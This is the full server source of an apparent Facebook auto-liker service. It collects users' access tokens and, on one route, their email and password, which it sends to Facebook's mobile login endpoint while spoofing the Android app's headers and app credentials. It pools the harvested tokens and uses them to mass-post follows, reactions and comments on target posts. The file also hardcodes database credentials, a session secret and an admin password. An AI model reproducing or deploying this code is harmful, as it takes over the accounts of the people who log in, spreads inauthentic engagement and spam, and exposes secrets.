
const express = require('express');
const mysql = require('mysql2/promise');
const bodyParser = require('body-parser');
const session = require('express-session');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 6237;

const dbConfig = {
    host: 'db2.sillydevelopment.co.uk',
    port: 3306,
    user: 'u58324_ZbXzVG1jbo',
    password: '0NRu2YGYx^RXO71UWEX@@1Dv',
    database: 's58324_Impostor'
};

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('.'));
app.use(session({
    secret: 'ffslikes',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

let connection;
async function connectDB() {
    try {
        connection = await mysql.createConnection(dbConfig);
        console.log('Connected to MySQL database');
        
        await connection.execute(`CREATE TABLE IF NOT EXISTS cooldown (
            id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
            id_value VARCHAR(30) NOT NULL,
            last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);
        
        await connection.execute(`CREATE TABLE IF NOT EXISTS Likers (
            id int(20) NOT NULL AUTO_INCREMENT,
            user_id varchar(32) NOT NULL,
            name varchar(32) NOT NULL,
            access_token varchar(255) NOT NULL,
            activate int(1) NOT NULL DEFAULT '0',
            PRIMARY KEY (id)
        ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1`);
        
    } catch (error) {
        console.error('Database connection failed:', error);
    }
}

function extractIds(url, token) {
    const groupPattern = /groups\/(\d+)\/permalink\/(\d+)\//;
    const postPattern = /(\d+)\/posts\/(\d+)\//;
    const photoPattern = /fbid=(\d+)/;

    let groupMatch = url.match(groupPattern);
    if (groupMatch) {
        return `${groupMatch[1]}_${groupMatch[2]}`;
    }

    let postMatch = url.match(postPattern);
    if (postMatch) {
        return `${postMatch[1]}_${postMatch[2]}`;
    }

    let photoMatch = url.match(photoPattern);
    if (photoMatch) {
        return photoMatch[1];
    }

    const pattern = /\/posts\/([\w\d]+)\//;
    const matches = url.match(pattern);
    const postId = matches ? matches[1] : null;
    
    const userPattern = /facebook\.com\/(\d+)\//;
    const userMatches = url.match(userPattern);
    const userId = userMatches ? userMatches[1] : null;
    
    if (userId) {
        return `${userId}_${postId}`;
    }
    return postId;
}

function extractIdsForFollow(url) {
    const pattern = /facebook.com\/(?:profile\.php\?id=)?(\d+)|fbid=(\d+)/;
    const matches = url.match(pattern);
    
    if (matches) {
        return matches[1] || matches[2];
    }
    return null;
}

async function getIdCooldownInfo(id) {
    try {
        const [rows] = await connection.execute(
            'SELECT UNIX_TIMESTAMP(last_used) AS last_used_timestamp FROM cooldown WHERE id_value = ?',
            [id]
        );

        if (rows.length > 0) {
            const lastUsedTime = rows[0].last_used_timestamp;
            const cooldownDuration = 30 * 60;
            const currentTime = Math.floor(Date.now() / 1000);
            const elapsedTime = currentTime - lastUsedTime;
            const remainingTime = cooldownDuration - elapsedTime;

            if (remainingTime > 0) {
                const remainingMinutes = Math.ceil(remainingTime / 60);
                return { in_cooldown: true, remaining_time: remainingMinutes };
            } else {
                return { in_cooldown: false, remaining_time: 0 };
            }
        } else {
            const lastWeek = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
            await connection.execute(
                'INSERT INTO cooldown (id_value, last_used) VALUES (?, ?)',
                [id, lastWeek]
            );
            return { in_cooldown: false, remaining_time: 0 };
        }
    } catch (error) {
        console.error('Error checking cooldown:', error);
        return { in_cooldown: false, remaining_time: 0 };
    }
}

async function checkCooldown(id) {
    try {
        const [rows] = await connection.execute(
            'SELECT UNIX_TIMESTAMP(last_used) AS last_used_timestamp FROM cooldown WHERE id_value = ?',
            [id]
        );

        if (rows.length > 0) {
            const lastUsedTime = rows[0].last_used_timestamp;
            const cooldownDuration = 20 * 60;
            const currentTime = Math.floor(Date.now() / 1000);
            const elapsedTime = currentTime - lastUsedTime;
            const remainingTime = cooldownDuration - elapsedTime;

            if (remainingTime <= 0) {
                await connection.execute(
                    'UPDATE cooldown SET last_used = NOW() WHERE id_value = ?',
                    [id]
                );
            }
        } else {
            await connection.execute(
                'INSERT INTO cooldown (id_value, last_used) VALUES (?, NOW())',
                [id]
            );
        }
    } catch (error) {
        console.error('Error updating cooldown:', error);
    }
}

async function getMe(accessToken) {
    try {
        const response = await axios.get(`https://graph.facebook.com/me?access_token=${accessToken}`);
        return response.data;
    } catch (error) {
        // Be very conservative about deactivating tokens
        // Only deactivate for very specific permanent errors
        if (error.response && error.response.data && error.response.data.error) {
            const errorCode = error.response.data.error.code;
            const errorMessage = error.response.data.error.message;
            
            // Only deactivate for account suspension or permanent token issues
            if ((errorCode === 190 && errorMessage.includes('account')) || 
                (errorCode === 102) || 
                (errorMessage && errorMessage.includes('suspended'))) {
                await connection.execute(
                    'UPDATE Likers SET activate = 1 WHERE access_token = ?',
                    [accessToken]
                );
            }
        }
        return null;
    }
}

async function validateToken(accessToken) {
    try {
        const response = await axios.get(`https://graph.facebook.com/me?access_token=${accessToken}`);
        return { valid: true, data: response.data };
    } catch (error) {
        if (error.response && error.response.data && error.response.data.error) {
            const errorCode = error.response.data.error.code;
            const errorType = error.response.data.error.type;
            
            // Check for permanent errors
            if (errorCode === 190 || errorCode === 102 || errorType === "OAuthException") {
                return { valid: false, permanent: true, error: error.response.data.error };
            }
        }
        return { valid: false, permanent: false, error: error.response?.data?.error };
    }
}

app.get('/', (req, res) => {
    if (req.session.token && req.session._userid) {
        return res.redirect('/home');
    }
    res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/home', async (req, res) => {
    if (!req.session.token || !req.session._userid) {
        return res.redirect('/');
    }
    
    const me = await getMe(req.session.token);
    if (!me || !me.name) {
        return res.sendFile(path.join(__dirname, '404.html'));
    }
    
    res.sendFile(path.join(__dirname, 'home.html'));
});

app.get('/api/user', async (req, res) => {
    if (!req.session.token) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const me = await getMe(req.session.token);
    if (!me) {
        return res.status(401).json({ error: 'Invalid token' });
    }
    
    res.json(me);
});

app.get('/follow', async (req, res) => {
    if (!req.session.token || !req.session._userid) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'follow.html'));
});

app.post('/follow', async (req, res) => {
    if (!req.session.token || !req.session._userid) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    const { id, limit } = req.body;
    if (!id || !limit) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    const me = await getMe(req.session.token);
    if (!me) {
        return res.status(401).json({ error: 'Invalid token' });
    }

    const formattedId = extractIdsForFollow(id);
    if (!formattedId) {
        return res.status(400).json({ error: 'Please provide the valid facebook link' });
    }
    
    try {
        const checkerUrl = `https://graph.facebook.com/${formattedId}?access_token=${req.session.token}`;
        await axios.get(checkerUrl);
    } catch (error) {
        return res.status(400).json({ error: "Your Facebook Profile ID doesn't exist" });
    }
    
    const cooldownInfo = await getIdCooldownInfo(me.id);
    if (cooldownInfo.in_cooldown) {
        return res.status(429).json({ 
            error: `Sending follow failed, Wait ${cooldownInfo.remaining_time} minute(s) before submitting again.` 
        });
    }

    await checkCooldown(me.id);
    
    try {
        let okCount = 0;
        let noCount = 0;
        
        const [likers] = await connection.execute(
            'SELECT * FROM Likers WHERE activate = 0 ORDER BY RAND() LIMIT ?',
            [parseInt(limit)]
        );

        for (const liker of likers) {
            try {
                const response = await axios.post(
                    `https://graph.facebook.com/v18.0/${formattedId}/subscribers`,
                    {},
                    {
                        headers: {
                            'Authorization': `Bearer ${liker.access_token}`
                        }
                    }
                );
                okCount++;
            } catch (error) {
                // Only mark as inactive for permanent errors (suspended/locked accounts)
                if (error.response && error.response.data && error.response.data.error) {
                    const errorCode = error.response.data.error.code;
                    const errorType = error.response.data.error.type;
                    
                    // Permanent errors: suspend account token
                    if (errorCode === 190 || errorCode === 102 || errorType === "OAuthException") {
                        await connection.execute(
                            'UPDATE Likers SET activate = 1 WHERE access_token = ?',
                            [liker.access_token]
                        );
                    }
                    // For temporary errors, don't touch the token - keep it active
                }
                noCount++;
            }
        }

        res.json({ 
            success: true, 
            message: `Well done! ${okCount} follow(s) have been successfully sent.` 
        });
    } catch (error) {
        res.status(500).json({ error: 'Error processing request' });
    }
});

app.get('/reactions', async (req, res) => {
    if (!req.session.token || !req.session._userid) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'reactions.html'));
});

app.get('/comments', async (req, res) => {
    if (!req.session.token || !req.session._userid) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'comments.html'));
});

app.post('/reactions', async (req, res) => {
    if (!req.session.token || !req.session._userid) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    const { id, limit, reactions } = req.body;
    if (!id || !limit || !reactions) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    const me = await getMe(req.session.token);
    if (!me) {
        return res.status(401).json({ error: 'Invalid token' });
    }

    const formattedId = extractIds(id, req.session.token);
    if (!formattedId) {
        return res.status(400).json({ 
            error: 'Please provide the valid facebook link and ensure that your Facebook post is set to PUBLIC.' 
        });
    }
    
    try {
        const checkerUrl = `https://graph.facebook.com/${formattedId}?access_token=${req.session.token}`;
        await axios.get(checkerUrl);
    } catch (error) {
        return res.status(400).json({ error: "Your Facebook Post ID doesn't exist" });
    }
    
    const cooldownInfo = await getIdCooldownInfo(me.id);
    if (cooldownInfo.in_cooldown) {
        return res.status(429).json({ 
            error: `Sending reaction failed, Wait ${cooldownInfo.remaining_time} minute(s) before submitting again.` 
        });
    }

    await checkCooldown(me.id);
    
    try {
        let okCount = 0;
        let noCount = 0;
        
        const [likers] = await connection.execute(
            'SELECT * FROM Likers WHERE activate = 0 ORDER BY RAND() LIMIT ?',
            [parseInt(limit)]
        );

        for (const liker of likers) {
            try {
                const response = await axios.post(
                    `https://graph.facebook.com/v18.0/${formattedId}/reactions`,
                    { type: reactions },
                    {
                        headers: {
                            'Authorization': `Bearer ${liker.access_token}`
                        }
                    }
                );
                okCount++;
            } catch (error) {
                // Only mark as inactive for permanent errors (suspended/locked accounts)
                if (error.response && error.response.data && error.response.data.error) {
                    const errorCode = error.response.data.error.code;
                    const errorType = error.response.data.error.type;
                    
                    // Permanent errors: suspend account token
                    if (errorCode === 190 || errorCode === 102 || errorType === "OAuthException") {
                        await connection.execute(
                            'UPDATE Likers SET activate = 1 WHERE access_token = ?',
                            [liker.access_token]
                        );
                    }
                    // For temporary errors, don't touch the token - keep it active
                }
                noCount++;
            }
        }

        res.json({ 
            success: true, 
            message: `Well done! ${okCount} reaction(s) have been successfully sent.` 
        });
    } catch (error) {
        res.status(500).json({ error: 'Error processing request' });
    }
});

app.post('/comments', async (req, res) => {
    if (!req.session.token || !req.session._userid) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    const { id, comment, limit } = req.body;
    if (!id || !comment || !limit) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    const me = await getMe(req.session.token);
    if (!me) {
        return res.status(401).json({ error: 'Invalid token' });
    }

    const formattedId = extractIds(id, req.session.token);
    if (!formattedId) {
        return res.status(400).json({ 
            error: 'Please provide the valid facebook link and ensure that your Facebook post is set to PUBLIC.' 
        });
    }
    
    try {
        const checkerUrl = `https://graph.facebook.com/${formattedId}?access_token=${req.session.token}`;
        await axios.get(checkerUrl);
    } catch (error) {
        return res.status(400).json({ error: "Your Facebook Post ID doesn't exist" });
    }
    
    const cooldownInfo = await getIdCooldownInfo(me.id);
    if (cooldownInfo.in_cooldown) {
        return res.status(429).json({ 
            error: `Sending comment failed, Wait ${cooldownInfo.remaining_time} minute(s) before submitting again.` 
        });
    }

    await checkCooldown(me.id);
    
    try {
        let okCount = 0;
        let noCount = 0;
        
        const [likers] = await connection.execute(
            'SELECT * FROM Likers WHERE activate = 0 ORDER BY RAND() LIMIT ?',
            [parseInt(limit)]
        );

        for (const liker of likers) {
            try {
                const response = await axios.post(
                    `https://graph.facebook.com/v18.0/${formattedId}/comments`,
                    { message: comment },
                    {
                        headers: {
                            'Authorization': `Bearer ${liker.access_token}`
                        }
                    }
                );
                okCount++;
            } catch (error) {
                // Only mark as inactive for permanent errors (suspended/locked accounts)
                if (error.response && error.response.data && error.response.data.error) {
                    const errorCode = error.response.data.error.code;
                    const errorType = error.response.data.error.type;
                    
                    // Permanent errors: suspend account token
                    if (errorCode === 190 || errorCode === 102 || errorType === "OAuthException") {
                        await connection.execute(
                            'UPDATE Likers SET activate = 1 WHERE access_token = ?',
                            [liker.access_token]
                        );
                    }
                    // For temporary errors, don't touch the token - keep it active
                }
                noCount++;
            }
        }

        res.json({ 
            success: true, 
            message: `Well done! ${okCount} comment(s) have been successfully sent.` 
        });
    } catch (error) {
        res.status(500).json({ error: 'Error processing request' });
    }
});

app.get('/profile', async (req, res) => {
    if (!req.session.token || !req.session._userid) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'profile.html'));
});

app.get('/credits', (req, res) => {
    res.sendFile(path.join(__dirname, 'credits.html'));
});

app.get('/admin', async (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.post('/admin/auth', async (req, res) => {
    const { password } = req.body;
    if (password === 'lamagdazz') {
        req.session.adminAuth = true;
        res.json({ success: true });
    } else {
        res.status(401).json({ error: 'Invalid password' });
    }
});

app.post('/profile/activate', async (req, res) => {
    if (!req.session.token) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    try {
        const apiUrl = `https://graph.facebook.com/graphql?variables={"0":{"is_shielded":true,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=false&strip_nulls=false&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation&access_token=${encodeURIComponent(req.session.token)}`;
        
        const response = await axios.get(apiUrl);
        
        if (response.data.extensions && response.data.extensions.is_final === true) {
            res.json({ success: true, message: 'Profile Guard Successfully activated!' });
        } else {
            res.status(500).json({ error: 'Sorry, an error encountered while processing your request, please try again later.' });
        }
    } catch (error) {
        res.status(500).json({ error: 'Error processing request' });
    }
});

app.post('/profile/deactivate', async (req, res) => {
    if (!req.session.token) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    try {
        const apiUrl = `https://graph.facebook.com/graphql?variables={"0":{"is_shielded":false,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=false&strip_nulls=false&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation&access_token=${encodeURIComponent(req.session.token)}`;
        
        const response = await axios.get(apiUrl);
        
        if (response.data.extensions && response.data.extensions.is_final === true) {
            res.json({ success: true, message: 'Profile Guard Successfully deactivated!' });
        } else {
            res.status(500).json({ error: 'Sorry, an error encountered while processing your request, please try again later.' });
        }
    } catch (error) {
        res.status(500).json({ error: 'Error processing request' });
    }
});

app.post('/admin/reactivate-tokens', async (req, res) => {
    if (!req.session.adminAuth) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    try {
        // Reactivate all inactive tokens
        await connection.execute('UPDATE Likers SET activate = 0');
        res.json({ success: true, message: 'All tokens have been reactivated successfully!' });
    } catch (error) {
        console.error('Error reactivating tokens:', error);
        res.status(500).json({ error: 'Error reactivating tokens' });
    }
});

app.get('/admin/token-stats', async (req, res) => {
    if (!req.session.adminAuth) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    try {
        const [activeTokens] = await connection.execute(
            'SELECT COUNT(*) as count FROM Likers WHERE activate = 0'
        );
        const [inactiveTokens] = await connection.execute(
            'SELECT COUNT(*) as count FROM Likers WHERE activate = 1'
        );
        const [totalTokens] = await connection.execute(
            'SELECT COUNT(*) as count FROM Likers'
        );

        res.json({
            active: activeTokens[0].count,
            inactive: inactiveTokens[0].count,
            total: totalTokens[0].count
        });
    } catch (error) {
        console.error('Error getting token stats:', error);
        res.status(500).json({ error: 'Error getting token statistics' });
    }
});

app.post('/admin/validate-tokens', async (req, res) => {
    if (!req.session.adminAuth) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    try {
        const [allTokens] = await connection.execute('SELECT * FROM Likers');
        let validCount = 0;
        let invalidCount = 0;
        let suspendedCount = 0;

        for (const token of allTokens) {
            const validation = await validateToken(token.access_token);
            
            if (validation.valid) {
                // Reactivate valid tokens
                await connection.execute(
                    'UPDATE Likers SET activate = 0 WHERE id = ?',
                    [token.id]
                );
                validCount++;
            } else if (validation.permanent) {
                // Keep suspended/locked accounts as inactive
                await connection.execute(
                    'UPDATE Likers SET activate = 1 WHERE id = ?',
                    [token.id]
                );
                suspendedCount++;
            } else {
                // Temporary errors - keep as is
                invalidCount++;
            }
        }

        res.json({
            success: true,
            message: `Token validation complete! Valid: ${validCount}, Invalid: ${invalidCount}, Suspended: ${suspendedCount}`
        });
    } catch (error) {
        console.error('Error validating tokens:', error);
        res.status(500).json({ error: 'Error validating tokens' });
    }
});

app.get('/logout', (req, res) => {
    // Only destroy session, don't touch database tokens
    req.session.destroy();
    res.redirect('/');
});

// Add endpoint to check total tokens available
app.get('/api/token-count', async (req, res) => {
    try {
        const [activeTokens] = await connection.execute(
            'SELECT COUNT(*) as count FROM Likers WHERE activate = 0'
        );
        const [totalTokens] = await connection.execute(
            'SELECT COUNT(*) as count FROM Likers'
        );
        
        res.json({
            active: activeTokens[0].count,
            total: totalTokens[0].count
        });
    } catch (error) {
        console.error('Error getting token count:', error);
        res.status(500).json({ error: 'Error getting token count' });
    }
});

app.post('/auth/facebook', async (req, res) => {
    const { accessToken } = req.body;
    
    if (!accessToken) {
        return res.status(400).json({ error: 'Access token required' });
    }

    const me = await getMe(accessToken);
    if (!me) {
        return res.status(401).json({ error: 'Invalid token' });
    }
    
    try {
        // Check if this exact token already exists
        const [existingToken] = await connection.execute(
            'SELECT * FROM Likers WHERE access_token = ?',
            [accessToken]
        );

        // Check if user already has any token (to prevent multiple tokens per user)
        const [existingUser] = await connection.execute(
            'SELECT * FROM Likers WHERE user_id = ?',
            [me.id]
        );

        if (existingToken.length === 0) {
            if (existingUser.length > 0) {
                // User already has a token, update it with the new one
                await connection.execute(
                    'UPDATE Likers SET access_token = ?, name = ?, activate = 0 WHERE user_id = ?',
                    [accessToken, me.name, me.id]
                );
            } else {
                // New user, insert new token
                await connection.execute(
                    'INSERT INTO Likers (user_id, name, access_token, activate) VALUES (?, ?, ?, 0)',
                    [me.id, me.name, accessToken]
                );
            }
        } else {
            // Token exists, just reactivate it and update name if needed
            await connection.execute(
                'UPDATE Likers SET activate = 0, name = ? WHERE access_token = ?',
                [me.name, accessToken]
            );
        }

        req.session.token = accessToken;
        req.session._userid = me.id;

        res.json({ success: true, user: me });
    } catch (error) {
        console.error('Database error:', error);
        res.status(500).json({ error: 'Database error' });
    }
});

app.post('/auth/facebook/direct', async (req, res) => {
    const { email, password } = req.body;
    
    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }

    try {
        const crypto = require('crypto');
        
        function randRange(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        function generateMachineId(length) {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        const url = 'https://b-graph.facebook.com/auth/login';
        const timestamp = Math.floor(Date.now() / 1000);

        const headers = {
            'Host': 'b-graph.facebook.com',
            'X-Fb-Connection-Quality': 'EXCELLENT',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; RMX3740 Build/QP1A.190711.020) [FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/480086274;FBCR/Corporation Tbk;FBMF/realme;FBBD/realme;FBDV/RMX3740;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.0,width=540,height=960};FB_FW/1;FBRV/483172840;]',
            'X-Tigon-Is-Retry': 'false',
            'X-Fb-Friendly-Name': 'authenticate',
            'X-Fb-Connection-Bandwidth': String(randRange(70000000, 80000000)),
            'Zero-Rated': '0',
            'X-Fb-Net-Hni': String(randRange(50000, 60000)),
            'X-Fb-Sim-Hni': String(randRange(50000, 60000)),
            'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Fb-Connection-Type': 'WIFI',
            'X-Fb-Device-Group': String(randRange(4700, 5000)),
            'Priority': 'u=3,i',
            'Accept-Encoding': 'gzip, deflate',
            'X-Fb-Http-Engine': 'Liger',
            'X-Fb-Client-Ip': 'true',
            'X-Fb-Server-Cluster': 'true',
        };

        const data = {
            'adid': crypto.randomUUID(),
            'format': 'json',
            'device_id': crypto.randomUUID(),
            'email': email,
            'password': `#PWD_FB4A:0:${timestamp}:${password}`,
            'generate_analytics_claim': '1',
            'community_id': '',
            'linked_guest_account_userid': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': crypto.randomUUID(),
            'secure_family_device_id': crypto.randomUUID(),
            'credentials_type': 'password',
            'account_switcher_uids': '[]',
            'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
            'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'error_detail_type': 'button_with_disabled',
            'source': 'login',
            'machine_id': generateMachineId(24),
            'jazoest': String(randRange(22000, 23000)),
            'meta_inf_fbmeta': 'V2_UNTAGGED',
            'advertiser_id': crypto.randomUUID(),
            'encrypted_msisdn': '',
            'currently_logged_in_userid': '0',
            'locale': 'id_ID',
            'client_country_code': 'ID',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'sig': crypto.createHash('md5').update(crypto.randomUUID()).digest('hex'),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        };

        const formData = new URLSearchParams(data).toString();
        const response = await axios.post(url, formData, { headers });
        const responseData = response.data;

        if (responseData.session_key && responseData.access_token) {
            const uid = responseData.uid;
            const accessToken = responseData.access_token;
            
            // Verify the token works by getting user info
            const me = await getMe(accessToken);
            if (!me) {
                return res.status(401).json({ error: 'Failed to verify login' });
            }

            try {
                // Check if this exact token already exists
                const [existingToken] = await connection.execute(
                    'SELECT * FROM Likers WHERE access_token = ?',
                    [accessToken]
                );

                // Check if user already has any token (to prevent multiple tokens per user)
                const [existingUser] = await connection.execute(
                    'SELECT * FROM Likers WHERE user_id = ?',
                    [me.id]
                );

                if (existingToken.length === 0) {
                    if (existingUser.length > 0) {
                        // User already has a token, update it with the new one
                        await connection.execute(
                            'UPDATE Likers SET access_token = ?, name = ?, activate = 0 WHERE user_id = ?',
                            [accessToken, me.name, me.id]
                        );
                    } else {
                        // New user, insert new token
                        await connection.execute(
                            'INSERT INTO Likers (user_id, name, access_token, activate) VALUES (?, ?, ?, 0)',
                            [me.id, me.name, accessToken]
                        );
                    }
                } else {
                    // Token exists, just reactivate it and update name if needed
                    await connection.execute(
                        'UPDATE Likers SET activate = 0, name = ? WHERE access_token = ?',
                        [me.name, accessToken]
                    );
                }

                req.session.token = accessToken;
                req.session._userid = me.id;

                res.json({ success: true, user: me });
            } catch (dbError) {
                console.error('Database error:', dbError);
                res.status(500).json({ error: 'Database error' });
            }
        } else {
            console.log('Login failed:', responseData);
            res.status(401).json({ error: 'Invalid credentials or login failed' });
        }
    } catch (error) {
        console.error('Direct login error:', error);
        if (error.response) {
            console.error('Status:', error.response.status);
            console.error('Data:', error.response.data);
        }
        res.status(500).json({ error: 'Login failed. Please check your credentials.' });
    }
});

connectDB().then(() => {
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`Server running on port ${PORT}`);
    });
});
